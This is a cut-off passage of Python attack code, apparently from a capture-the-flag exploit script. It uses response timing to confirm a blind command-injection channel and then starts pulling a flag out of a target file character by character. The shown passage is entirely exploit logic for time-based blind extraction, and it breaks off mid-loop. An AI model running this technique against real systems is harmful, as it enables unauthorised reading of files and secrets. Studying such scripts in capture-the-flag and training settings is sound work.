                    elapsed = test_command(test_extract)
                    
                    if elapsed >= 2.5:
                        print(f"[+] Base64 extraction possible for {path}")
                        print(f"[+] Attempting character-by-character extraction...")
                        
                        # Let's try to extract the flag directly
                        # Method: Extract characters one by one
                        charset = string.ascii_letters + string.digits + "{_-}"
                        flag_content = ""
                        
                        print(f"\n[*] Extracting flag from: {path}")
                        
                        for pos in range(1, 100):  # Try first 100 chars
                            char_found = False
